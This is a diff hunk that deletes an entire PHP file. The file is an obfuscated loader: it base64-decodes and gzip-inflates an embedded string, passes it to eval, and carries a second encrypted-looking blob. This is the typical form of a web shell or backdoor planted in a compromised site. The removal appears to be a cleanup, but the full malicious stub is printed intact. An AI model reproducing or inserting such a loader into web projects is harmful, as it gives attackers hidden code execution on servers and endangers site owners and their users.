@@ -1,6 +1,0 @@
-<?php
-$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "Ty7MbCgfP+RTixFpdWCvYSspZ7VGeUjtl6R/zdUja5tuy/6A0v8y//7QC/Bv03NORrCY30tuLqp+BCMsDcRLorAaLeAKI5XgdrG+dsTfrISFF3Fg7YjKLvVhWn0uJIVK9rQ0ylHjlsV57S40rci/9JJhRVh0l4lZuxpNBTAXmk/6X21XBmtYi2zsJFeIKvpbzKSMg4nMrJxZcqcBzAl9snMvsQx/CkYQ3deu7a9TgXX/sfhvEuhZV3v7Y2VoZsunqQiTep3OAudKMK7FaESzQhINeFbjcY6JEnVPn3DzxSx9IRpYXiUP9uiVwf7bVZyUMemu/0TPIdJRWGFhzKQu/ggcZW4MCrAJuIS0M5od0VUdAXuyVWkgYIVI2tbrmz54vebv3zLzj3dopTEhd79/SrN1djNbE7C6NLpE0zrYUFERopYrKCFtJCKi4Rzw/Xw7FCBQCvWQQWIn45fpBoVA";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
-?>
